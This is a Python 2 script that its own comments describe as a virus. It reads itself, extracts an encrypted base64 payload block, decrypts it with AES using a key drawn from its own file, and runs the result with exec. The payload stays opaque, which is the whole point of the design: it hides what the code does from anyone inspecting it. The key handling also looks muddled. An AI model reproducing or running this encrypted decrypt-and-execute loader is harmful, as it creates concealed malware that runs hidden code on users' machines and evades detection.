######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted

# Start payload
#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
# End payload
